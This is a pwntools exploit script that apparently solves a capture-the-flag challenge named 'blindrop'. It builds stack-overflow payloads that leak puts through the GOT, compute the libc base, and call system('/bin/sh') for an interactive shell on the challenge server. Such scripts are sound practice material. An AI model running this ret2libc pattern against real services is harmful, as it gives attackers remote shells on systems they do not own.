from pwn import *

#io = process("./blindrop")
io = remote("challenge.xiaoyuyc.com", 30650)

elf = ELF("./blindrop")
libc = ELF("./libc6-i386_2.35-0ubuntu3.14_amd64.so")

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main = elf.sym['main']

canary = 0xDCC82F00
io.recvuntil(b"payload> ")
payload = b"a" * (0x8c - 0xc) + p32(main) + b"a" * (8+ 4) + p32(puts_plt) + p32(main) + p32(puts_got) 
io.send(payload)
io.recvuntil(b"canary check passed.")
puts_addr = u32(io.recvuntil(b"\xf7")[-4:])
print("puts address =", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print("libc base = ", hex(libc_base))
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.sym["system"]
print("binsh =", hex(binsh))
print("system = ", hex(system))
io.recvuntil(b"payload> ")
payload = b"a" * (0x8c - 0xc) + p32(main) + b"a" * (8+ 4) + p32(system) + p32(main) + p32(binsh) 
io.send(payload)

io.interactive()
